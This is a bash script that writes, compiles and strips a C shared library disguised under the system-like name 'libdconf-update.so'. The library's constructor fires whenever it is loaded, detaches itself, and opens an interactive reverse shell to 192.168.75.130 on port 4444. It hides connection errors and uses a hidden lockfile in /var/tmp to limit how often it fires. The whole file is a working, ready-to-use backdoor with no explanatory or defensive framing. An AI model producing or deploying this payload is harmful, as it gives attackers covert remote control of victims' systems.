#!/usr/bin/env bash
# --- CONFIGURATION ---
LHOST="192.168.75.130"
LPORT="4444"
OUT_FILE="libdconf-update.so"
LOCKFILE="/var/tmp/.dconf-lock"
RATE_LIMIT=10

# --- GENERATE C SOURCE ---
cat <<EOF > payload.c
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <sys/stat.h>
#include <time.h>
#include <string.h>

static int _should_fire(void) {
    // Check if already inside a shell
    if (getenv("RE_SHELL")) return 0;

    // Rate limiting check
    struct stat st;
    if (stat("${LOCKFILE}", &st) == 0) {
        time_t now; time(&now);
        if ((now - st.st_mtime) < ${RATE_LIMIT}) return 0;
    }
    FILE *f = fopen("${LOCKFILE}", "w");
    if (f) fclose(f);
    return 1;
}

__attribute__((constructor))
static void _init(void) {
    if (!_should_fire()) return;
    if (fork() != 0) return;
    setsid();
    if (fork() != 0) _exit(0);

    // Set an environment variable so sub-shells don't re-trigger the loop
    setenv("RE_SHELL", "1", 1);

    // Redirect stderr to /dev/null so "Connection refused" stays hidden
    char *args[] = {"/bin/bash", "-c", "exec bash -i &>/dev/tcp/${LHOST}/${LPORT} <&1 2>/dev/null", NULL};
    execv("/bin/bash", args);
    _exit(0);
}
EOF

# --- COMPILE ---
gcc -shared -fPIC -nostartfiles -o "$OUT_FILE" payload.c -s
rm payload.c
echo "[+] Compiled $OUT_FILE with LHOST $LHOST"